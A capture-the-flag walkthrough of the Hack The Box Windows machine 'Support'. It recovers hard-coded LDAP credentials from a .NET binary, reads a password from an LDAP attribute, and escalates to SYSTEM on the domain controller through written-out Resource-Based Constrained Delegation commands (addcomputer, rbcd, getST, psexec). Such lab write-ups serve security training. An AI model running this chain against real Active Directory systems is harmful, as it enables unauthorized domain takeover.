# Support — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Windows |
| **Difficulty** | Easy |
| **Domain** | `support.htb` / `dc.support.htb` |

## Synopsis

Support is an easy Windows **Active Directory** machine. An anonymously readable SMB share
(`support-tools`) hosts a custom .NET utility, `UserInfo.exe`. Reverse-engineering it recovers
the hard-coded **LDAP bind credentials** (the password is XOR-obfuscated and base64-encoded in
the binary). Authenticating to LDAP and reading the directory shows the `support` account's
`info` attribute contains its cleartext password. As `support`, BloodHound reveals the account
is a member of **Shared Support Accounts**, which has **GenericAll** over the Domain Controller
computer object. This is abused with **Resource-Based Constrained Delegation (RBCD)** to
impersonate the Administrator and obtain a SYSTEM shell.

---

## Enumeration

### Nmap

```bash
nmap -p- --min-rate=5000 -T4 <target>
nmap -p53,88,135,139,389,445,464,636,3268,5985 -sCV <target>
```

A standard Domain Controller footprint (DNS, Kerberos, LDAP, SMB, WinRM). Add
`support.htb` and `dc.support.htb` to `/etc/hosts`.

![Nmap scan of the Domain Controller](../images/support-01-nmap.png)

### SMB — anonymous share

```bash
smbclient -L //<target>/ -N
smbclient //<target>/support-tools -N
```

The `support-tools` share is readable anonymously and contains several utilities plus
`UserInfo.exe.zip`. Download and extract it:

```bash
smb: \> get UserInfo.exe.zip
unzip UserInfo.exe.zip
```

![Anonymous listing and download from the support-tools share](../images/support-02-smb-share.png)

---

## Foothold

### Reverse-engineering UserInfo.exe

`UserInfo.exe` is a .NET assembly. Open it in **dnSpy** / **ILSpy**. It queries LDAP using a
hard-coded service account. The password is stored as a base64 blob that is XOR-decoded at
runtime against a static key, with an extra per-byte constant:

```csharp
// Protected.getPassword()  (reconstructed)
enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd/aV...";  // base64
key          = "armando";                          // XOR key
// result XORed byte-by-byte, then ^ 0xDF
```

Decode it (e.g. with a short Python/CyberChef recipe) to recover the LDAP bind password for
`ldap@support.htb`.

![dnSpy showing the XOR/base64 password-recovery routine](../images/support-03-dnspy-ldap-password.png)

### LDAP → support account password

Use the recovered `ldap` credentials to read the directory. The `support` user object hides a
password in its **`info`** attribute:

```bash
ldapsearch -x -H ldap://dc.support.htb -D 'support\ldap' -w '<ldap-pass>' \
  -b 'DC=support,DC=htb' '(sAMAccountName=support)'
# ...
# info: <support-user-cleartext-password>
```

![ldapsearch revealing the password in the support user's info attribute](../images/support-04-ldap-info-attr.png)

Confirm and grab the user flag over WinRM:

```bash
evil-winrm -i dc.support.htb -u support -p '<support-pass>'
```

The **user flag** is in `C:\Users\support\Desktop\user.txt`.

---

## Privilege Escalation — RBCD via GenericAll on the DC

Collect AD data with BloodHound:

```bash
bloodhound-python -u support -p '<support-pass>' -d support.htb -ns <target> -c all
```

BloodHound shows **support → (member of) Shared Support Accounts → GenericAll → DC$**.
`GenericAll` over the DC computer object permits a **Resource-Based Constrained Delegation**
attack:

1. Create a computer account (default `ms-DS-MachineAccountQuota = 10`):

   ```bash
   addcomputer.py support.htb/support:'<support-pass>' -computer-name 'EVIL$' \
     -computer-pass 'Evil123!' -dc-ip <target>
   ```

2. Set the DC's `msDS-AllowedToActOnBehalfOfOtherIdentity` to trust `EVIL$`:

   ```bash
   rbcd.py support.htb/support:'<support-pass>' -delegate-from 'EVIL$' \
     -delegate-to 'DC$' -action write -dc-ip <target>
   ```

3. Request a service ticket impersonating Administrator:

   ```bash
   getST.py support.htb/EVIL$:'Evil123!' -spn 'cifs/dc.support.htb' \
     -impersonate Administrator -dc-ip <target>
   export KRB5CCNAME=Administrator.ccache
   ```

4. Use the ticket to get SYSTEM:

   ```bash
   psexec.py -k -no-pass dc.support.htb
   ```

![RBCD chain: addcomputer → rbcd → getST → psexec as SYSTEM](../images/support-05-rbcd-system.png)

```
C:\> whoami
nt authority\system
```

The **root flag** is in `C:\Users\Administrator\Desktop\root.txt`.
